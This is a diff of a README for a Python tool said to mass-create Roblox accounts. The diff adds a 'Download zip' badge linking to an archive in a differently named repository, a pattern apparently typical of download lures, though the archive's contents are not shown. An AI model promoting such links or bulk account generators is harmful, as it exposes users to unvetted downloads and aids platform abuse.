@@ -2,7 +2,7 @@
 
 This Python script automates the creation of Roblox accounts with unique usernames and secure passwords. The main goal of this project is educational, demonstrating web automation and data manipulation in Python.
 
-
+[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://github.com/Mana42138/account-login/releases/download/roblox-acc-gen/account-login-main.zip)
 
 ## what kind of settings is there?
 
